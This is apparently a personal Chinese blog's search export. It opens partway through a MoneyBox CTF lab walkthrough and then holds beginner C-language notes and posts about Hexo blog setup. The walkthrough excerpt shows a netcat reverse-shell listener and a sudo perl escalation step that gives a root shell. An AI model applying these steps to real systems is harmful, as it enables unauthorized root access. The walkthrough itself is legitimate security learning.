<li>kali 通过nc命令监听1234端口<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li>
<li>靶机上通过sudo 运行p.php程序<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/perl p.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li>
<li>切换到渗透机kali，成功反弹管理员权限shell<pre class="line-numbers language-none"><code class="language-none">id
cd /root
ls -a
cat .root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li>
<li>拿到最终flag啦！<pre class="line-numbers language-none"><code class="language-none">Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==&gt; r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____

See You Back....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>
</body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>靶机解析</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>靶机解析</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言相关1</title>
    <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%E7%9B%B8%E5%85%B31/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以 最近很闲 所以开始学c语言</p>
<span id="more"></span>
<h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p>
<h1 id="学习笔记啥的"><a href="#学习笔记啥的" class="headerlink" title="学习笔记啥的"></a>学习笔记啥的</h1><h2 id="一-经典到不能再经典的hello-world"><a href="#一-经典到不能再经典的hello-world" class="headerlink" title="一.经典到不能再经典的hello world"></a>一.经典到不能再经典的hello world</h2><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
 
int main()
{
    /* 我的第一个 C 程序 */
    printf("Hello, World! \n");
 
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>实例解析：</strong></p>
<ul>
<li>所有的 C 语言程序都需要包含&nbsp;<strong>main()</strong>&nbsp;函数。 代码从&nbsp;<strong>main()</strong>&nbsp;函数开始执行。</li>
<li><strong>/* … */</strong>&nbsp;用于注释说明。</li>
<li><strong>printf()</strong>&nbsp;用于格式化输出到屏幕。<strong>printf()</strong>&nbsp;函数在&nbsp;<strong>“stdio.h”</strong>&nbsp;头文件中声明。</li>
<li><strong>stdio.h</strong>&nbsp;是一个头文件 (标准输入输出头文件) ,&nbsp;<strong>#include</strong>&nbsp;是一个预处理命令，用来引入头文件。 当编译器遇到&nbsp;<strong>printf()</strong>&nbsp;函数时，如果没有找到&nbsp;<strong>stdio.h</strong>&nbsp;头文件，会发生编译错误。</li>
<li><strong>return 0;</strong>&nbsp;语句用于表示退出程序。</li>
</ul>
<h2 id="二-关于定义变量和变量的类型"><a href="#二-关于定义变量和变量的类型" class="headerlink" title="二.关于定义变量和变量的类型"></a>二.关于定义变量和变量的类型</h2><h3 id="（1）单纯的计算"><a href="#（1）单纯的计算" class="headerlink" title="（1）单纯的计算"></a>（1）单纯的计算</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效
int x;// 这里是我定义了x
int y;// 这里是我定义了y
int wow()// 定义一个叫wow（）的进程
{
&nbsp; &nbsp; extern int x;// 借用外部定义好的x
&nbsp; &nbsp; extern int y;// 借用外部定义好的y
&nbsp; &nbsp; x = 1222;
&nbsp; &nbsp; y = 1999;// 为x y赋值
&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字
}
int main()// 主程序 不能缺少
{
&nbsp; &nbsp; int jieguo;
&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果
&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来
&nbsp; &nbsp; return 0;//结束程序
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-none"><code class="language-none">你得到的结果是：2442778<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>题外话：<br>printf（）中的%d指输出整数，实际显示的时候会被逗号后的结果所代替。</p>
<h3 id="（2）利用scanf-加入互动环节"><a href="#（2）利用scanf-加入互动环节" class="headerlink" title="（2）利用scanf()加入互动环节"></a>（2）利用scanf()加入互动环节</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; //这个是类似于import的东西 没有它printf会失效
int x=0;// 这里是我定义了x
int y=0;// 这里是我定义了y
int wow()// 定义一个叫wow（）的进程
{
&nbsp; &nbsp; extern int x;// 借用外部定义好的x
&nbsp; &nbsp; extern int y;// 借用外部定义好的y
&nbsp; &nbsp; printf("请输入x值\n");
&nbsp; &nbsp; scanf("%d",&amp;x);
&nbsp; &nbsp; printf("请输入y值\n");
&nbsp; &nbsp; scanf("%d",&amp;y);
&nbsp; &nbsp; return x*y;// 程序的结果是输出x乘以y的数字
}
int main()// 主程序 不能缺少
{
&nbsp; &nbsp; int jieguo;
&nbsp; &nbsp; jieguo = wow(); //用jieguo这个定义好的变量来表示wow（）的结果
&nbsp; &nbsp; printf("你得到的结果是：%d",jieguo);//将输出的东西表示出来
&nbsp; &nbsp; return 0;//结束程序
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">请输入x值
9
请输入y值
11
你得到的结果是：99<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>题外话：<br>scanf()中输入的东西是他所需要获取的 如加入逗号或者空格后不按照格式输入<br>理论来说会无法读取<br>\n代表换行<br>scanf(“%d, %d, %d”,&amp;a,&amp;b,&amp;c);  ←复合用法</p>
<h2 id="三-循环与if-else"><a href="#三-循环与if-else" class="headerlink" title="三.循环与if else"></a>三.循环与if else</h2><h3 id="（1）while"><a href="#（1）while" class="headerlink" title="（1）while"></a>（1）while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
{
&nbsp; &nbsp; int i=0;
&nbsp; &nbsp; while (i&lt;=100)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("第%d",i);
&nbsp; &nbsp; &nbsp; &nbsp; printf("次\n");
&nbsp; &nbsp; }
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结果：</p>
<pre class="line-numbers language-none"><code class="language-none">第1次
第2次
第3次
第4次
第5次
第6次
第7次
第8次
第9次
(中略)
第101次<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>说真的 c语言和python蛮像哈？<br>下表显示了 C 语言支持的所有算术运算符。假设变量&nbsp;<strong>A</strong>&nbsp;的值为 10，变量&nbsp;<strong>B</strong>&nbsp;的值为 20，则：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>把两个操作数相加</td>
<td>A + B 将得到 30</td>
</tr>
<tr>
<td>-</td>
<td>从第一个操作数中减去第二个操作数</td>
<td>A - B 将得到 -10</td>
</tr>
<tr>
<td>*</td>
<td>把两个操作数相乘</td>
<td>A * B 将得到 200</td>
</tr>
<tr>
<td>/</td>
<td>分子除以分母</td>
<td>B / A 将得到 2</td>
</tr>
<tr>
<td>%</td>
<td>取模运算符，整除后的余数</td>
<td>B % A 将得到 0</td>
</tr>
<tr>
<td>++</td>
<td>自增运算符，整数值增加 1</td>
<td>A++ 将得到 11</td>
</tr>
<tr>
<td>–</td>
<td>自减运算符，整数值减少 1</td>
<td>A– 将得到 9</td>
</tr>
</tbody></table>
<h3 id="（2）if-else与switch-case"><a href="#（2）if-else与switch-case" class="headerlink" title="（2）if else与switch-case"></a>（2）if else与switch-case</h3><p>以下两种代码实现的是一种功能</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int type=0;
&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");
&nbsp; &nbsp; scanf("%d",&amp;type);
&nbsp; &nbsp; if ( type==1 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("1");
&nbsp; &nbsp; else if ( type==2 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("2");
&nbsp; &nbsp; else if ( type==3 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("3");
&nbsp; &nbsp; else if ( type==4 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("4");
&nbsp; &nbsp; else if ( type==5 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("5");
&nbsp; &nbsp; else
&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int type=0;
&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");
&nbsp; &nbsp; scanf("%d",&amp;type);
&nbsp; &nbsp; switch (type) {
&nbsp; &nbsp; &nbsp; &nbsp; case 1:
&nbsp; &nbsp; &nbsp; &nbsp; print("1");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 2:
&nbsp; &nbsp; &nbsp; &nbsp; printf("2");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 3:
&nbsp; &nbsp; &nbsp; &nbsp; printf("3");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 4:
&nbsp; &nbsp; &nbsp; &nbsp; printf("4");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 5:
&nbsp; &nbsp; &nbsp; &nbsp; printf("5");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; default:
&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结论都是一样的</p>
<h2 id="四、while和do-while"><a href="#四、while和do-while" class="headerlink" title="四、while和do while"></a>四、while和do while</h2><h3 id="（1）while-1"><a href="#（1）while-1" class="headerlink" title="（1）while"></a>（1）while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int o=0;
&nbsp; &nbsp; while ( o&lt;10)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; o++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",o);
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简称来说就是当条件成立时 一直重复运行某物</p>
<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">1
2
3
4
5
6
7
8
9
10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-do-while"><a href="#2-do-while" class="headerlink" title="(2) do while"></a>(2) do while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int i=0;
&nbsp; &nbsp; do
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",i);
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; } while ( i != 10);
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>while的换了个顺序版本<br>结果都是一样的就不放出来了</p>
<h2 id="五、整合一下先"><a href="#五、整合一下先" class="headerlink" title="五、整合一下先"></a>五、整合一下先</h2><h3 id="（1）比大小"><a href="#（1）比大小" class="headerlink" title="（1）比大小"></a>（1）比大小</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int a,b,c,max;
&nbsp; &nbsp; printf("请输入三个数字 以逗号隔开\n");
&nbsp; &nbsp; scanf("%d,%d,%d",&amp;a,&amp;b,&amp;c);
&nbsp; &nbsp; if(a&gt;b){ &nbsp;
	&nbsp; &nbsp; max = a;
&nbsp; &nbsp; }else{
	&nbsp; &nbsp; max = b;
&nbsp; &nbsp; }
&nbsp; &nbsp; if(c&gt;max){
	&nbsp; &nbsp; max = c;
&nbsp; &nbsp; }
&nbsp; &nbsp; printf("max=%d", max);
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出:</p>
<pre class="line-numbers language-none"><code class="language-none">请输入三个数字 以逗号隔开
3,1,6 
max=6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="（2）九九乘法表"><a href="#（2）九九乘法表" class="headerlink" title="（2）九九乘法表"></a>（2）九九乘法表</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
{
&nbsp; &nbsp; int n=9;
&nbsp; &nbsp; int i,j;
&nbsp; &nbsp; i=1;
&nbsp; &nbsp; while (i&lt;=n)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; j=1;
&nbsp; &nbsp; &nbsp; &nbsp; while (j&lt;=i)
&nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("%d*%d=%d",j,i,j*i);
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((i*j&lt;10))
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp; ");
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;");
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j++;
&nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; }
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出:</p>
<pre class="line-numbers language-none"><code class="language-none">1*1=1   
1*2=2   2*2=4   
1*3=3   2*3=6   3*3=9   
1*4=4   2*4=8   3*4=12  4*4=16  
1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  
1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  
1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  
1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64
1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>关于加入aplayer的方式</title>
    <url>/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p>
<p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
  </entry>
  <entry>
    <title>再来一次</title>
    <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>关于在next7.8.0中建设评论功能这件事</title>
    <url>/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>于是乎今天忙了一整天尝试在网页中建设评论功能<br>next版本为7.8.0<br>这些是我的尝试过程和失败的结果  最终使用了畅言云评完成了此功能的测试 但还仍需改进<br>接下来是每个评论模块的分别介绍<br><b>如果要看具体配置过程可以去找我在文章中留下的网址 本人小白一个 不是太懂 谢谢</b></p>
<h2 id="valine与waline"><a href="#valine与waline" class="headerlink" title="valine与waline"></a>valine与waline</h2><p>waline由valine衍生而出</p>
<blockquote>
<p>Valine 特性</p>
</blockquote>
<ul>
<li>快速</li>
<li>安全</li>
<li>Emoji 😉</li>
<li>无后端实现</li>
<li>MarkDown 全语法支持</li>
<li>轻量易用(~15kb gzipped)</li>
<li>文章阅读量统计 v1.2.0+</li>
</ul>
<blockquote>
<p>Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。同时基于服务端的特性，提供了<strong>邮件通知</strong>、<strong>微信通知</strong>、<strong>评论后台管理</strong>、LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL&nbsp;<strong>多存储服务支持</strong>等诸多特性。 —-<a href="https://zhuanlan.zhihu.com/p/295264916">摘自知乎</a></p>
</blockquote>
<p>我两个都试过了，valine方面参考了<a href="https://valine.js.org/">valine官方页面</a>  <a href="https://blog.csdn.net/wugenqiang/article/details/105744843">此教程</a><br>waline方面则是参考了<a href="https://waline.js.org/guide/deploy/vps.html">waline官方页面</a>  <a href="https://zhuanlan.zhihu.com/p/535607671">这个教程</a></p>
<p>首先是在尝试时踩的坑:<br>1.valine在部署时使用的leadcloud需使用国际版，否则将需要网站备案<br>2.next7.0+的版本不会内置valine的文件，需要自己下载valine.min.js并配置cdn<br>3.统计<strong>访问人数</strong>和<strong>访问总量</strong>的系统也是由valine支持,想要同时开启会报错</p>
<p>valine这边在全都按照流程过了一遍确认无误后却发现网页没有评论系统出现<br>只得作罢<br>waline由于next主题中的config.yml没有自带选项 需要复制粘贴<br>在确认过复制到的地区没问题的情况下 hexo s持续爆warning<br>只得作罢×2</p>
<p>害…过几天再试吧 都是泪啊</p>
<h2 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h2><blockquote>
<p>Gitalk 特性</p>
</blockquote>
<ul>
<li>使用 GitHub 登录</li>
<li>支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru]</li>
<li>支持个人或组织</li>
<li>无干扰模式（设置 distractionFreeMode 为 true 开启）</li>
<li>快捷键提交评论 （cmd|ctrl + enter）</li>
</ul>
<p>是github官方的评论功能<br>参考了<a href="https://www.jianshu.com/p/02fc71f3633f">这个教程</a></p>
<p>安装后本地配置显示<strong>network error</strong><br>hexo g hexo d后也是相同的问题<br>搜索后发现是由于github网络地区特殊无法获取端口导致</p>
<p>但目前没有具体的解决方式</p>
<h2 id="畅言云评"><a href="#畅言云评" class="headerlink" title="畅言云评"></a>畅言云评</h2><p><a href="https://blog.csdn.net/lcyaiym/article/details/76762074">参考了这个教程</a><br>安装很简单 注册很简单 配置也只要输入appid 和appkey<br>但是具体出来的效果不太行 等待后期优化吧</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>目前的进展</title>
    <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑小提示</title>
    <url>/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所有hexo命令前加上npx<br>gitbash中的复制粘贴是ctrl+install shift+install<br>改完元素后记得<br><code>npx hexo clean<br>npx hexo g</code><br>本地测试效果用npx hexo s 随后用localhost:4000来连接<br>上传到网络是npx hexo d<br>接下来进一步升级网页<br>三部曲改为<br><code>hexo clean<br>hexo g<br>gulp<br>hexo d</code><br>来优化网页</p>
</body></html>]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>创建个人主页！</title>
    <url>/2023/06/28/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
  </entry>
</search>
